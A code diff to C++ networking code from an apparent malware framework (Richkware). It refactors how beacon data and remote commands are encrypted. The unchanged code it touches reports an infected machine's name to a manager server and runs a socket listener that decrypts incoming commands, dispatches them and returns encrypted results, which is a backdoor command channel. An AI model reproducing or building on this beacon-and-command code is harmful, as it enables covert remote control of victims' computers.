@@ -134,6 +134,7 @@ std::string Network::RawRequest(const char* serverAddress, const char* port,	con
 
 bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, const char* port) {
     const char* serverPort = server.getPort();
+    Crypto crypto(encryptionKey);
 
     std::string name = getenv("COMPUTERNAME");
     name.append("/");
@@ -142,7 +143,7 @@ bool Network::UploadInfoToRichkwareManagerServer(const char * serverAddress, con
     Device device = Device(name, serverPort);
 
     std::string deviceStr = "$" + device.getName() + "," + device.getServerPort() + "$";
-    deviceStr = Encrypt(deviceStr, encryptionKey);
+    deviceStr = crypto.Encrypt(deviceStr);
 
     RawRequest(serverAddress, port, ("GET /Richkware-Manager-Server/LoadData?data=" +deviceStr +" HTTP/1.1\r\n"
             "Host: " + serverAddress + "\r\n"+
@@ -295,6 +296,7 @@ DWORD WINAPI ClientSocketThread(void* arg) {
     ClientSocketThreadArgs csta = *((ClientSocketThreadArgs*)arg);
     SOCKET ClientSocket = csta.ClientSocket;
     const char* encryptionKey = csta.encryptionKey;
+    Crypto crypto(encryptionKey);
 
     const int bufferlength = 512;
     int iResult;
@@ -314,7 +316,7 @@ DWORD WINAPI ClientSocketThread(void* arg) {
         command.append(recvbuf);
 
         // string decryption
-        if (encryptionKey != NULL) command = Decrypt(command, encryptionKey);
+        if (encryptionKey != NULL) command = crypto.Decrypt(command);
 
         posSubStr = command.find("\n");
         if (posSubStr != std::string::npos) {
@@ -323,7 +325,7 @@ DWORD WINAPI ClientSocketThread(void* arg) {
 
             response = CommandsDispatcher(command);
             // string encryption
-            if (encryptionKey != NULL) response = Encrypt(response, encryptionKey);
+            if (encryptionKey != NULL) response = crypto.Encrypt(response);
 
             iSendResult = send(ClientSocket, response.c_str(),
                                (int)strlen(response.c_str()), 0);
